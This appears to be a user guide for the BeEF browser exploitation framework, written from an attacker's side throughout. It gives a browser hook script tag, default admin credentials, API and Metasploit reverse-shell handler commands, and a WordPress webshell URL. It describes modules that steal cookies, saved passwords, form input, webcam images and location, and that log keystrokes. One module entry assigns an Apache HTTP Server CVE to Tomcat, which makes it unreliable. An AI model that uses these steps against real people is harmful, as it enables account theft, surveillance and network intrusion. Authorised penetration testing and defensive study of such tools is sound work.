# BeEF Command Modules — Complete Documentation

> **Framework:** Browser Exploitation Framework (BeEF)
> **Version:** 0.5.4.0
> **Total Modules:** 303 enabled
> **Admin UI:** `http://localhost:3000/ui/authentication`
> **Credentials:** `server` / `server1337`

---

## Table of Contents

1. [Setup & How to Run Commands](#1-setup--how-to-run-commands)
2. [Browser Code Reference](#2-browser-code-reference)
3. [Status Code Reference](#3-status-code-reference)
4. [BROWSER Modules](#4-browser-modules)
5. [CHROME EXTENSIONS Modules](#5-chrome-extensions-modules)
6. [DEBUG Modules](#6-debug-modules)
7. [EXPLOITS Modules](#7-exploits-modules)
8. [HOST Modules](#8-host-modules)
9. [IPEC Modules](#9-ipec-inter-protocol-exploitationcommunication-modules)
10. [METASPLOIT Modules](#10-metasploit-modules)
11. [MISC Modules](#11-misc-modules)
12. [NETWORK Modules](#12-network-modules)
13. [PERSISTENCE Modules](#13-persistence-modules)
14. [PHONEGAP Modules](#14-phonegap-modules)
15. [SOCIAL ENGINEERING Modules](#15-social-engineering-modules)
16. [Guaranteed Working Combinations](#16-guaranteed-working-combinations)

---

## 1. Setup & How to Run Commands

### Step 1 — Start the server
```bash
cd /home/vexo/project/OPERATING-SYSTEM-ANALYSIS/Applications/main-server
./start
```
Verify it's running:
```bash
cat /tmp/server.log | grep "server started\|API key"
```

### Step 2 — Hook a browser
A browser gets hooked when it loads any page containing:
```html
<script src="http://<YOUR_IP>:3000/hook.js"></script>
```
Test pages available at:
- `http://localhost:3000/demos/basic.html` — basic demo
- `http://localhost:3000/demos/sample.html` — login page (custom)

### Step 3 — Open the admin panel
```
http://localhost:3000/ui/authentication
```
Login → you will see the **Hooked Browsers** panel on the left.

### Step 4 — Execute a module
1. Click a hooked browser in the left panel
2. Go to the **Commands** tab
3. Browse the **Module Tree** on the left
4. Click a module → configure parameters → click **Execute**
5. Results appear in the **Command History** tab (bottom panel)

### Step 5 — Via REST API (advanced)
```bash
# Get API token from log
TOKEN=$(grep "RESTful API key" /tmp/server.log | tail -1 | awk '{print $NF}')

# List hooked browsers
curl "http://localhost:3000/api/hooks?token=$TOKEN"

# Execute a module (replace MODULE_ID and SESSION)
curl -H "Content-Type: application/json" \
     -d '{"module":"MODULE_ID","parameters":{}}' \
     "http://localhost:3000/api/modules/SESSION/MODULE_ID?token=$TOKEN"
```

---

## 2. Browser Code Reference

| Code | Browser | Notes |
|------|---------|-------|
| `ALL` / `All` | Every browser | Universal compatibility |
| `FF` | Mozilla Firefox | All versions unless range specified |
| `C` | Google Chrome | All versions unless range specified |
| `IE` | Internet Explorer | Versions 6–11 |
| `S` | Safari | Desktop and iOS |
| `O` | Opera | All versions unless range specified |

---

## 3. Status Code Reference

| Status | Meaning |
|--------|---------|
| `working` | Confirmed functional — will execute and return results |
| `not_working` | Confirmed broken on this browser — do not use |
| `user_notify` | Executes but shows visible UI to victim (alert, popup, dialog) |
| `unknown` | Untested — may or may not work |

---

## 4. BROWSER Modules

These modules run directly in the hooked browser via JavaScript.

---

### 4.1 Get Cookie
**What it does:** Retrieves all non-HttpOnly cookies from the current page session.
**Works on:** ALL browsers, ALL versions
**Does NOT work on:** HttpOnly cookies (browser security prevents JS access)
**Parameters:** None
**How to run:**
1. Hook any browser on any page
2. Module Tree → Browser → Get Cookie → Execute
3. Results appear immediately in Command History

**Guaranteed to work when:**
- Victim opens any hooked page
- Cookies exist for that domain
- Cookies are not marked `HttpOnly`

---

### 4.2 Get Page HTML
**What it does:** Returns the full HTML source of the page the victim is currently on.
**Works on:** ALL browsers, ALL versions
**Parameters:** None
**How to run:**
1. Hook browser → Module Tree → Browser → Get Page HTML → Execute
2. Full HTML returned in results within seconds

**Guaranteed to work when:** Any browser is hooked on any page.

---

### 4.3 Get Page and iframe HTML
**What it does:** Retrieves HTML from the current page AND any same-origin iframes embedded in it.
**Works on:** ALL browsers
**Parameters:** None
**How to run:** Same as Get Page HTML
**Guaranteed to work when:** Browser is hooked. Cross-origin iframes will be skipped (browser SOP blocks them).

---

### 4.4 Get Page HREFs
**What it does:** Extracts all hyperlinks (`href` attributes) from the hooked page. Useful for mapping a site.
**Works on:** ALL browsers
**Parameters:** None
**How to run:** Module Tree → Browser → Get Page HREFs → Execute
**Guaranteed to work when:** Any browser on any page with links.

---

### 4.5 Get Form Values
**What it does:** Captures the name, type, and current value of every input field on the page — including text boxes, passwords, hidden fields.
**Works on:** ALL browsers
**Parameters:** None
**How to run:** Module Tree → Browser → Get Form Values → Execute
**Guaranteed to work when:**
- Victim has typed into form fields (captures current values)
- Works best combined with waiting for user to fill the form first

**Pro tip:** Run this after victim has typed credentials but before they submit.

---

### 4.6 Get Autocomplete Credentials
**What it does:** Steals saved usernames and passwords that the browser auto-fills on login forms.
**Works on:** Firefox (all versions), Chrome (all versions)
**Does NOT work on:** IE, Safari, Opera
**Parameters:** None
**Requirements:** Victim must have saved credentials for the hooked origin
**How to run:** Hook browser on a login page → Execute
**Guaranteed to work when:**
- Firefox or Chrome is the browser
- User has previously saved credentials for that site
- On Firefox: the window must have focus

---

### 4.7 Get Stored Credentials
**What it does:** Retrieves saved username/password from the browser's credential manager for the current login page origin.
**Works on:** Firefox only
**Does NOT work on:** All other browsers
**Parameters:**
- `Login URL` — the URL of the login page
**How to run:** Hook Firefox browser on a login page → set Login URL → Execute
**Guaranteed to work when:** Firefox is used and only ONE set of saved credentials exists for the origin.

---

### 4.8 Get Local Storage
**What it does:** Extracts all data stored in `localStorage` for the hooked origin — often contains session tokens, user data, app state.
**Works on:** IE 8+, Firefox 4+, Chrome 4+, Safari 4+, Opera 11+
**Parameters:** None
**How to run:** Module Tree → Browser → Get Local Storage → Execute
**Guaranteed to work when:** Any modern browser (2011+) is hooked and the site uses localStorage.

---

### 4.9 Get Session Storage
**What it does:** Extracts all data from `sessionStorage` — temporary storage that clears when the tab closes.
**Works on:** IE 8+, Firefox 4+, Chrome 4+, Safari 4+, Opera 11+
**Parameters:** None
**How to run:** Same as Get Local Storage
**Guaranteed to work when:** Any modern browser is hooked.

---

### 4.10 Fingerprint Browser
**What it does:** Uses FingerprintJS2 to identify browser type, version, OS, plugins, screen resolution, timezone, and dozens of other attributes.
**Works on:** ALL browsers
**Parameters:** None
**How to run:** Module Tree → Browser → Fingerprint Browser → Execute
**Guaranteed to work when:** Any browser is hooked.

---

### 4.11 Fingerprint Browser (PoC)
**What it does:** Fingerprints browser type using URI protocol handlers specific to Safari, IE, and Firefox.
**Works on:** IE, Firefox, Safari
**Does NOT work on:** Chrome, Opera (by design)
**Parameters:** None

---

### 4.12 Fingerprint Ajax
**What it does:** Detects which JavaScript/Ajax libraries are loaded on the page (jQuery version, Prototype, Mootools, etc.).
**Works on:** Firefox, Safari
**Does NOT work on:** Chrome
**Parameters:** None

---

### 4.13 Detect ActiveX
**What it does:** Checks if the browser supports ActiveX controls.
**Works on:** IE only (shows user notification)
**Does NOT work on:** All other browsers
**Parameters:** None

---

### 4.14 Detect Unsafe ActiveX
**What it does:** Checks if IE is configured to allow unsafe ActiveX scripting (a dangerous misconfiguration).
**Works on:** IE only
**Parameters:** None

---

### 4.15 Detect Evernote Web Clipper
**What it does:** Checks if the Evernote Web Clipper browser extension is installed.
**Works on:** Chrome only
**Does NOT work on:** IE
**Parameters:** None

---

### 4.16 Detect Extensions
**What it does:** Detects browser extensions installed in Chrome or Firefox.
**Works on:** Firefox 1–50, Chrome 1–18 only
**Does NOT work on:** Modern Chrome/Firefox (extension detection was patched)
**Parameters:** None
**Note:** This module is mostly obsolete on modern browsers due to security fixes.

---

### 4.17 Detect FireBug
**What it does:** Checks if the Firebug extension is being used to inspect the current window.
**Works on:** Firefox only
**Does NOT work on:** All other browsers
**Parameters:** None

---

### 4.18 Detect Foxit Reader
**What it does:** Checks if Foxit Reader PDF plugin is installed.
**Works on:** All browsers
**Parameters:** None

---

### 4.19 Detect LastPass
**What it does:** Checks if the LastPass password manager extension is active.
**Works on:** All browsers except IE
**Parameters:** None

---

### 4.20 Detect MIME Types
**What it does:** Retrieves the full list of MIME types the browser supports (reveals installed plugins).
**Works on:** All browsers except IE
**Parameters:** None

---

### 4.21 Detect MS Office
**What it does:** Detects the version of Microsoft Office installed on the victim's machine.
**Works on:** IE only
**Does NOT work on:** All other browsers
**Parameters:** None

---

### 4.22 Detect Popup Blocker
**What it does:** Checks whether the browser has popup blocking enabled.
**Works on:** All browsers (shows user notification)
**Parameters:** None

---

### 4.23 Detect QuickTime / RealPlayer / Silverlight / VLC / Windows Media Player / Unity Web Player
**What they do:** Check for presence of respective media plugins.
**Works on:** All browsers (VLC: IE, Firefox, Chrome only)
**Parameters:** None
**Note:** Most of these plugins are deprecated/removed in modern browsers. Results may be negative on Chrome 70+ / Firefox 75+ due to plugin removal.

---

### 4.24 Detect Simple Adblock
**What it does:** Checks if the Simple Adblock module is active.
**Works on:** IE only
**Does NOT work on:** All other browsers
**Parameters:** None

---

### 4.25 Detect Toolbars
**What it does:** Detects which browser toolbars are installed (Google Toolbar, Yahoo Toolbar, etc.).
**Works on:** All browsers
**Parameters:** None

---

### 4.26 Get Visited Domains
**What it does:** Extracts recently visited domains using cache timing attacks — no browser history permission needed.
**Works on:** Firefox, IE, Opera
**Does NOT work on:** Chrome, Safari (patched)
**Parameters:**
- `Domains` — semicolon-separated list of domains to check with optional favicon URLs
**How to run:** Pre-populate domain list → Execute on Firefox/IE/Opera
**Guaranteed to work when:** Firefox or IE is hooked (Chrome patched this in 2010).

---

### 4.27 Get Visited URLs (Old Browsers)
**What it does:** Detects visited URLs using CSS history sniffing.
**Works on:** IE 6–7, Firefox 3, Chrome 1–5, Safari 3, Opera 1–10 only
**Does NOT work on:** Modern browsers (patched)
**Parameters:** `URL(s)` — list of URLs to check

---

### 4.28 Get Visited URLs (Avant Browser)
**What it does:** Retrieves browser history via `AFRunCommand()` privileged function.
**Works on:** Avant Browser in Firefox engine mode only
**Parameters:** None

---

### 4.29 Create Alert Dialog
**What it does:** Sends a JavaScript `alert()` popup to the hooked browser.
**Works on:** ALL browsers (user will see the popup)
**Parameters:**
- `Alert text` — message to display (default: "BeEF Alert Dialog")
**How to run:** Execute → victim sees popup immediately
**Guaranteed to work when:** Any browser is hooked. Note: victim will see this.

---

### 4.30 Create Prompt Dialog
**What it does:** Sends a JavaScript `prompt()` dialog asking for input from the victim.
**Works on:** ALL browsers (user will see it)
**Parameters:** `Prompt text`
**Returns:** Whatever the victim types into the prompt

---

### 4.31 Replace Content (Deface)
**What it does:** Replaces the entire page body, title, and favicon with attacker-controlled content.
**Works on:** ALL browsers (victim will notice)
**Parameters:**
- `New Title` — page title to set
- `New Favicon` — URL to favicon image
- `Deface Content` — HTML content to replace the page with

---

### 4.32 Replace Component (Deface)
**What it does:** Overwrites a specific element on the page using a jQuery selector.
**Works on:** ALL browsers
**Parameters:**
- `Target Selector` — jQuery selector (e.g., `#login-form`, `.header`, `body`)
- `Deface Content` — replacement HTML

---

### 4.33 Redirect Browser (Standard)
**What it does:** Silently redirects the victim's browser to any URL.
**Works on:** ALL browsers
**Parameters:** `Redirect URL`
**How to run:** Enter target URL → Execute → victim is immediately redirected
**Guaranteed to work when:** Any browser is hooked.

---

### 4.34 Redirect Browser (iFrame)
**What it does:** Loads the target URL inside a 100%×100% invisible iframe while keeping the hook alive. The URL bar does not change.
**Works on:** ALL browsers
**Parameters:**
- `Redirect URL` — page to load in iframe
- `New Title` — page title override
- `New Favicon` — favicon override
- `Timeout` — delay before loading

---

### 4.35 Redirect Browser (Rickroll)
**What it does:** Overwrites the entire page with a full-screen Rickroll video.
**Works on:** ALL browsers
**Parameters:** None

---

### 4.36 Link Rewrite
**What it does:** Rewrites all matching links on the page to point to an attacker URL.
**Works on:** ALL browsers
**Parameters:** `URL` — the replacement URL

---

### 4.37 Link Rewrite (Click Events)
**What it does:** Same as Link Rewrite but uses click event handlers, hiding the real target more effectively.
**Works on:** ALL browsers except Opera
**Parameters:** `URL`

---

### 4.38 Link Rewrite (HTTPS)
**What it does:** Downgrades all HTTPS links on the page to HTTP (SSL stripping preparation).
**Works on:** ALL browsers
**Parameters:** None

---

### 4.39 Link Rewrite (TEL)
**What it does:** Rewrites all `tel:` phone number links to dial an attacker-chosen number.
**Works on:** ALL browsers
**Parameters:** `Number` — phone number to substitute

---

### 4.40 Overflow Cookie Jar
**What it does:** Wipes HttpOnly and HTTPS-flagged cookies using CookieJar overflow, then lets you recreate them as accessible cookies.
**Works on:** Safari, Chrome, Firefox, IE
**Parameters:** Option to preserve non-HttpOnly cookies
**How to run:** Execute → then use Get Cookie to read recreated cookies

---

### 4.41 Play Sound
**What it does:** Plays an audio file on the hooked browser.
**Works on:** All browsers EXCEPT IE ≤8, Firefox ≤2, Safari ≤3
**Parameters:** `Sound File Path` — URL to the audio file
**Guaranteed to work on:** Firefox 3+, Chrome 1+, Safari 4+, IE 9+

---

### 4.42 Spyder Eye
**What it does:** Takes a screenshot of what is visible in the victim's browser window using html2canvas.
**Works on:** IE 9+, Firefox 3+, Chrome 1+, Safari 6+, Opera 12+
**Parameters:**
- `Repeat` — number of screenshots to take (default: 1)
- `Delay` — ms between screenshots (default: 3000ms)
**How to run:** Hook browser on a real HTTPS page → Execute → screenshot saved to `~/.server/screenshot_<IP>_<timestamp>.png`
**Known limitations:**
- Does NOT work reliably on `http://localhost` — returns blank canvas
- Cross-origin resources (images from CDNs) will be missing from screenshot
- Page must be fully loaded before executing
**Guaranteed to work when:**
- Victim is on an HTTPS page (or same-origin HTTP)
- Firefox 3+ or Chrome is used
- Page has no heavy cross-origin resource restrictions

---

### 4.43 Webcam (Flash)
**What it does:** Displays an Adobe Flash "Allow Camera" dialog. If victim clicks Allow, captures photos.
**Works on:** All browsers with Flash installed
**Parameters:**
- `Title` — dialog title text
- `Body` — body text (use social engineering here)
- `Count` — number of pictures to take
- `Interval` — ms between shots
**Requires:** Adobe Flash installed on victim's browser
**Note:** Flash is end-of-life (EOL January 2021). Will not work on any modern browser.

---

### 4.44 Webcam HTML5
**What it does:** Uses `getUserMedia` WebRTC API to capture images from victim's webcam.
**Works on:** Chrome, Firefox (HTTPS only), Edge
**Does NOT work on:** HTTP pages (browser blocks camera on non-HTTPS)
**Parameters:** `Image Size` — 320×240, 640×480, or Full (1280×720)
**Requirements:**
- Server must be running on HTTPS, OR
- Hook must be served from an HTTPS page
- Victim must accept the camera permission prompt
**How to enable HTTPS:**
```yaml
# In config.yaml:
https:
    enable: true
    key: "server_key.pem"
    cert: "server_cert.pem"
```
Then restart: `./stop && ./start`
**Guaranteed to work when:**
- BeEF is served over HTTPS
- Firefox or Chrome is hooked
- Victim clicks "Allow" on the camera prompt

---

### 4.45 Webcam Permission Check
**What it does:** Silently checks if Flash camera/mic permission has already been granted for the BeEF domain — no popup, fully invisible.
**Works on:** All browsers with Flash
**Parameters:** None

---

### 4.46 Spyder Eye (screenshot) — Save Location
Screenshots saved to:
```
~/.server/screenshot_<victim_IP>_-_<timestamp>_<command_id>.png
```

---

### 4.47 Apache Tomcat Cookie Disclosure
**What it does:** Exploits CVE-2012-0053 to read cookies including HttpOnly ones via Apache Tomcat 2.2.0–2.2.21.
**Works on:** All browsers
**Parameters:** `'Request Header Example' path`
**Requirements:** Target server must be running vulnerable Apache Tomcat

---

### 4.48 Cisco ASA Plaintext Passwords
**What it does:** Recovers username, password, and MFA used for a Cisco ASA WebVPN session.
**Works on:** All browsers
**Parameters:** None
**Requirements:** Hook must run in context of the Cisco ASA origin

---

### 4.49 Clear Console
**What it does:** Clears the Chrome developer console buffer to hide JS execution traces.
**Works on:** Chrome only
**Does NOT work on:** All other browsers
**Parameters:** None

---

### 4.50 Disable Developer Tools
**What it does:** Prevents users from running JavaScript in IE Developer Tools console.
**Works on:** IE 8–11 only
**Parameters:** None

---

### 4.51 Remove Hook Element
**What it does:** Removes the BeEF `<script>` hook element from the DOM — but the underlying JS object stays active.
**Works on:** All browsers
**Parameters:** None
**Use case:** Clean up traces in DOM inspector while maintaining hook.

---

### 4.52 Remove Stuck iFrame
**What it does:** Removes all iframes from the hooked page.
**Works on:** ALL browsers
**Parameters:** None
**Warning:** Removes ALL iframes on the page, not just BeEF ones.

---

### 4.53 Replace Videos
**What it does:** Replaces embedded video objects with a YouTube video (Rickroll by default).
**Works on:** ALL browsers
**Parameters:**
- `YouTube Video ID` — e.g. `dQw4w9WgXcQ`
- `jQuery Selector` — default: all embed tags

---

### 4.54 Unhook
**What it does:** Completely removes the BeEF hook from the page. Browser will no longer respond to commands.
**Works on:** All browsers
**Parameters:** None
**Use case:** Clean exit after completing an operation.

---

### 4.55 iOS Address Bar Spoofing
**What it does:** Spoofs the browser address bar on iOS Safari to show a fake URL.
**Works on:** Safari on iOS ONLY (fixed in latest iOS versions)
**Parameters:**
- `Fake URL` — what to show in address bar
- `Real URL` — actual destination
- `jQuery Selector` — links to rewrite

---

### 4.56 Get Visited URLs (Avant Browser)
**What it does:** Retrieves browser history via `AFRunCommand()`.
**Works on:** Avant Browser in Firefox engine mode only
**Parameters:** None

---

## 5. CHROME EXTENSIONS Modules

These modules require a hooked Chrome browser with a compromised extension that has the relevant permissions.

---

### 5.1 Execute On Tab
**What it does:** Opens a new tab and executes JavaScript on it.
**Works on:** Chrome (requires `tabs` permission in compromised extension)
**Parameters:** None

---

### 5.2 Get All Cookies
**What it does:** Steals ALL cookies including HttpOnly ones, bypassing the normal JS restriction — because the extension has direct cookie API access.
**Works on:** Chrome with compromised extension that has cookie permission
**Parameters:** `URL` — filter by URL (leave empty for all cookies)
**This is more powerful than Get Cookie** — it can read HttpOnly cookies that `document.cookie` cannot.

---

### 5.3 Grab Google Contacts
**What it does:** Exports the victim's Google contacts via the CSV export feature if they are logged into Google.
**Works on:** Chrome with compromised extension
**Parameters:** None

---

### 5.4 Inject Server
**What it does:** Injects the BeEF hook script into ALL open browser tabs at once.
**Works on:** Chrome with compromised extension
**Parameters:** None
**Use case:** Massively extend hook coverage across all victim tabs.

---

### 5.5 Screenshot
**What it does:** Screenshots the current active tab. Returns as base64 data URL.
**Works on:** Chrome with compromised extension
**Parameters:** None
**Note:** Unlike Spyder Eye this uses the Chrome extension API — no canvas limitations.

---

### 5.6 Send Gvoice SMS
**What it does:** Sends an SMS via the victim's Google Voice account if they are logged in.
**Works on:** Chrome with compromised extension
**Parameters:** Phone number, message text

---

## 6. DEBUG Modules

Used for testing BeEF functionality — not for use against targets.

---

### 6.1 Raw JavaScript / Test Modules
| Module | Purpose |
|--------|---------|
| Test CORS Request | Tests cross-origin request function |
| Test HTTP Redirect | Tests redirect handler |
| Test Network Request | Tests basic net.request |
| Return Ascii Chars | Returns ASCII character set |
| Return Image | Tests base64 image return |
| Test Returning Results | Returns string of specified length |
| Test server.debug() | Tests console.log wrapper |
| DNS Tunnel (debug) | Tests DNS data exfiltration |

---

## 7. EXPLOITS Modules

These exploit specific vulnerabilities in servers and software. Most require specific conditions.

---

### 7.1 Apache Cookie Disclosure (CVE-2012-0053)
**What it does:** Reads victim cookies including HttpOnly ones by exploiting Apache HTTP Server 2.2.0–2.2.21.
**Works on:** All browsers
**Target server:** Apache 2.2.0–2.2.21
**Parameters:** None
**Guaranteed to work when:** Target web server is running vulnerable Apache version.

---

### 7.2 Apache Felix Remote Shell (Reverse Shell)
**What it does:** Gets a reverse shell on Apache Felix OSGi server using the `exec` command.
**Works on:** All browsers
**Requirements:**
- `org.eclipse.osgi` and `org.eclipse.equinox.console` bundles must be installed and active
- Target must be on reachable subnet

---

### 7.3 ActiveX Command Execution
**What it does:** Executes arbitrary OS commands via `WSCRIPT.Shell` ActiveX object.
**Works on:** IE only
**Requirements:** IE must have "Initialize and script ActiveX controls not marked as safe" ENABLED
**Parameters:** Command to execute
**Note:** Command response is NOT returned to BeEF.

---

### 7.4 CSRF Exploits (Airlive, D-Link, Linksys, boastMachine, etc.)
**What they do:** Perform Cross-Site Request Forgery attacks against specific devices/apps using the victim's browser as a relay.

| Module | Target | Action |
|--------|--------|--------|
| Airlive Add User CSRF | Airlive IP cameras (POE2600HD, POE250HD, etc.) | Adds admin user |
| Dlink DCS CSRF | D-Link DCS series cameras | Changes password |
| Linksys WVC CSRF | Linksys WVC series cameras | Changes admin password |
| boastMachine Add User | boastMachine ≤3.1 | Adds user |
| HP uCMDB Add User | HP uCMDB | Adds users via JMX |
| Opencart Reset Password | Opencart | Resets user password |
| FreeNAS Reverse Shell | FreeNAS 8.2.0 | Reverse root shell |
| Jenkins Code Exec | Jenkins | Reverse shell via Groovy console |
| GlassFish WAR Upload | GlassFish 3.1.1 | Deploys malicious WAR |

**How CSRF modules work:**
1. Victim's hooked browser must be on a network where it can reach the target device
2. Device must have no CSRF protection (older firmware)
3. For camera modules: victim's browser makes requests to the camera's local IP
4. No credentials required if device uses default auth or none

---

### 7.5 ColdFusion Directory Traversal (CVE-2010-2861)
**What it does:** Reads arbitrary files from a ColdFusion 8.0–9.0.1 server.
**Works on:** All browsers
**Parameters:** Path to traverse

---

### 7.6 D-Link ShareCenter Command Execution
**What it does:** Executes commands on D-Link NAS (DNS-320, DNS-325).
**Works on:** All browsers
**Parameters:** Command (spaces not supported)

---

### 7.7 Exploits Requiring Metasploit
The following require Metasploit running alongside BeEF:
- **Jboss 6.0.0M1 JMX Deploy** — needs `multi/handler` with `java/jsp_shell_reverse_tcp`
- **Jenkins Code Exec** — needs `multi/handler`
- **HTA PowerShell** (social engineering) — needs `multi/handler` with `windows/meterpreter/reverse_https`

Setup:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <your_ip>
set LPORT 443
exploit -j -z
```
Then enable Metasploit extension in `config.yaml` and restart BeEF.

---

### 7.8 Java Payload
**What it does:** Injects a signed Java Applet that provides shell commands and file upload/download.
**Works on:** All browsers with Java plugin
**Requirements:** JavaPayload handler running:
```bash
java javapayload.handler.stager.StagerHandler <payload> <IP> <port> -- JShell
```
**Note:** Windows Vista not supported. Java plugin is EOL in modern browsers.

---

### 7.9 Mozilla nsIProcess XPCOM (Windows)
**What it does:** Executes arbitrary commands via Firefox's `nsIProcess` interface.
**Works on:** Firefox only (requires chrome-privileged XSS)
**Requirements:** XSS injection in a Firefox extension context

---

### 7.10 Safari Launch App (CVE-2011-3230)
**What it does:** Launches an application from the victim machine.
**Works on:** Safari ≤5.1 on OS X only
**Parameters:** Application path

---

### 7.11 Windows Mail Client DoS
**What it does:** Crashes Windows Mail by exploiting an unhandled exception.
**Works on:** All browsers
**Target OS:** Windows Vista/7 with Windows Mail installed
**Parameters:** None

---

### 7.12 NtfsCommonCreate DoS
**What it does:** Causes browser hang and system instability via NTFS flaw.
**Works on:** All browsers
**Target OS:** Windows Vista, 7, 8.1 only

---

## 8. HOST Modules

These interact with the victim's host system beyond just the browser.

---

### 8.1 Get Geolocation (API)
**What it does:** Gets the victim's physical GPS location using the browser Geolocation API.
**Works on:** All modern browsers
**Parameters:** None
**Requirements:** Victim must click **Allow** on the location permission prompt
**Returns:** Latitude, longitude, accuracy
**Guaranteed to work when:** Mobile browser (phone GPS is precise); on desktop accuracy is lower (IP-based).

---

### 8.2 Get Geolocation (Third-Party)
**What it does:** Gets approximate victim location using third-party IP geolocation APIs — no permission prompt.
**Works on:** All browsers
**Parameters:** None
**Returns:** City, region, country, approximate coordinates
**Guaranteed to work when:** Any browser is hooked — no user interaction required.

---

### 8.3 Get System Info (Java)
**What it does:** Retrieves OS details, JVM version, NIC names and IPs, CPU count, memory, and screen modes via unsigned Java Applet.
**Works on:** All browsers with Java plugin
**Note:** Java plugin removed from Chrome 42+, Firefox 52+.

---

### 8.4 Get Wireless Keys
**What it does:** Retrieves saved WiFi profiles from the target Windows system.
**Works on:** All browsers
**Target OS:** Windows Vista and Windows 7 ONLY
**Returns:** WLAN profile XML including SSIDs and authentication details

---

### 8.5 Hook Default Browser
**What it does:** Uses a PDF to trigger and hook the victim's default browser (typically IE or Chrome).
**Works on:** All browsers
**Parameters:** None
**Use case:** Victim is using Firefox but you want to also hook their IE or Chrome.

---

### 8.6 Hook Microsoft Edge
**What it does:** Uses the `microsoft-edge:` protocol handler to open and hook Edge.
**Works on:** Any browser on Windows 10/11
**Parameters:** None
**Note:** Victim will see a prompt to open Edge.

---

### 8.7 Make Skype Call
**What it does:** Forces the victim's browser to initiate a Skype call.
**Works on:** All browsers
**Requirements:** Skype installed on victim's machine
**Parameters:** None

---

### 8.8 Make Telephone Call
**What it does:** Forces iOS browser to initiate a phone call via `tel:` URL scheme.
**Works on:** All browsers on iOS
**Parameters:** None

---

## 9. IPEC (Inter-Protocol Exploitation/Communication) Modules

These use the browser as a relay to communicate with other protocols on internal networks.

---

### 9.1 Cross-Site Printing (XSP)
**What it does:** Sends raw data to a network printer (port 9100) on the internal network.
**Works on:** All browsers
**Parameters:**
- `Target Address` — IP of internal printer
- `Target Port` — default 9100
- `Data` — text to print
**Guaranteed to work when:** Target printer is on the victim's subnet and has port 9100 open.

---

### 9.2 Cross-Site Faxing (XSF)
**What it does:** Sends fax data to an ActiveFax RAW server (port 3000) on the internal network.
**Works on:** All browsers
**Parameters:** Target Address, fax number

---

### 9.3 IRC
**What it does:** Connects the hooked browser to an IRC server, joins a channel, and sends messages.
**Works on:** All browsers
**Parameters:** Server, port, channel, message
**Note:** Some IRC servers (e.g., Freenode) block connections from web browsers.

---

### 9.4 IMAP
**What it does:** Sends IMAP4 commands to an internal mail server using the browser as relay.
**Works on:** All browsers
**Note:** Default IMAP port 143 is blocked by browsers (port banning). Use non-standard port.

---

### 9.5 Redis
**What it does:** Sends Redis commands to an internal Redis daemon.
**Works on:** All browsers
**Parameters:** Target Address, Redis commands (use `\\n` to separate commands)
**Note:** Results are NOT returned to BeEF.

---

### 9.6 Bindshell (POSIX)
**What it does:** Sends commands to a bound POSIX shell on an internal target.
**Works on:** All browsers
**Parameters:** Target Address, port, command
**Note:** Results are NOT returned.

---

### 9.7 Bindshell (Windows)
**What it does:** Sends commands to a bound Windows cmd.exe shell on an internal target.
**Works on:** All browsers
**Parameters:** Target Address, port, commands (use `&` to separate)
**Note:** Results are NOT returned.

---

### 9.8 DNS Tunnel (Client → Server)
**What it does:** Exfiltrates data from hooked browser to BeEF server using DNS queries as the covert channel. Data is XOR'd and URL-encoded.
**Works on:** All browsers
**Requirements:** DNS extension enabled, BeEF DNS server listening on port 53

---

### 9.9 DNS Tunnel (Server → Client)
**What it does:** Receives data sent from server to client over a DNS covert channel.
**Requirements:** S2C DNS Tunnel extension enabled

---

### 9.10 ETag Tunnel (Server → Client)
**What it does:** Hides data in HTTP ETag response headers to send from server to client.
**Requirements:** ETag extension enabled

---

## 10. METASPLOIT Modules

### 10.1 Browser AutoPwn
**What it does:** Redirects the hooked browser to a Metasploit autopwn listener, which automatically tries every applicable browser exploit.
**Works on:** All browsers
**Parameters:** URL to Metasploit autopwn listener
**Requirements:**
1. Enable Metasploit extension in `config.yaml`:
```yaml
metasploit:
    enable: true
```
2. Start Metasploit listener:
```bash
use auxiliary/server/browser_autopwn2
set LHOST <your_ip>
run
```
3. Restart BeEF, then execute module
**Guaranteed to work when:** Metasploit extension is properly connected and victim uses an older/unpatched browser.

---

## 11. MISC Modules

---

### 11.1 Raw JavaScript
**What it does:** Executes any arbitrary JavaScript code in the hooked browser and returns the result.
**Works on:** ALL browsers
**Parameters:** `JavaScript Code` — multiline scripts supported
**How to run:**
```javascript
// Example: get user's timezone
return Intl.DateTimeFormat().resolvedOptions().timeZone;
```
**Guaranteed to work when:** Any browser is hooked. This is the most flexible module.

---

### 11.2 BlockUI Modal Dialog / UnBlockUI
**What it does:** BlockUI — overlays the entire browser window with a blocking message. UnBlockUI removes it.
**Works on:** ALL browsers
**Parameters:** `Message` — HTML content to display in the overlay
**Use case:** Pretend the page is loading / maintenance to keep victim on the page.

---

### 11.3 iFrame Event Key Logger
**What it does:** Creates a full-screen 100%×100% iFrame overlay with keystroke logging. Captures everything the victim types.
**Works on:** All browsers except Opera
**Parameters:** `iFrame Src` — URL to load inside the iframe
**Guaranteed to work when:** Firefox or Chrome is hooked. Victim must be typing.

---

### 11.4 iFrame Sniffer
**What it does:** Framesniffing — checks if specific anchors exist on cross-origin pages (determines if victim has visited or is logged in to specific sites).
**Works on:** Safari, IE only
**Does NOT work on:** Chrome, Firefox (patched)

---

### 11.5 Create Invisible iFrame
**What it does:** Creates a hidden iFrame pointing to any URL. Useful for loading resources or triggering CSRF silently.
**Works on:** ALL browsers
**Parameters:** URL, width, height

---

### 11.6 Local File Theft
**What it does:** Reads local files from the victim's machine if the hook is loaded via `file://` scheme.
**Works on:** Safari only
**Requirements:** Victim must have opened a local HTML file containing the hook
**Returns:** Contents of common local files

---

### 11.7 Track Physical Movement
**What it does:** Tracks the physical movement and orientation of the victim's device using `DeviceMotionEvent`.
**Works on:** ALL browsers — but iOS only
**Parameters:** None

---

### 11.8 No Sleep
**What it does:** Prevents device screen from sleeping using NoSleep.js.
**Works on:** iOS and Android browsers only
**Parameters:** None

---

### 11.9 Read Gmail
**What it does:** Reads unread Gmail messages if the hook runs in the `mail.google.com` origin context.
**Works on:** ALL browsers
**Requirements:** Hook must be injected into mail.google.com (via XSS or extension compromise)

---

### 11.10 WordPress Modules

| Module | What it does | Works on |
|--------|-------------|---------|
| WordPress Add User | Adds a WordPress user (no email sent) | All browsers |
| WordPress Current User Info | Gets current WP user details | All browsers |
| WordPress Upload RCE Plugin | Uploads malicious plugin for RCE | All browsers |
| WordPress Post-Auth RCE | Uploads + activates malicious plugin | All browsers |

**Requirements for WordPress modules:**
- Hook must run in the context of the WordPress site origin
- For RCE: victim must be logged in as admin
**RCE shell trigger URL after execution:**
```
http://target-wordpress.site/wp-content/plugins/beefbind/beefbind.php?cmd=whoami
```

---

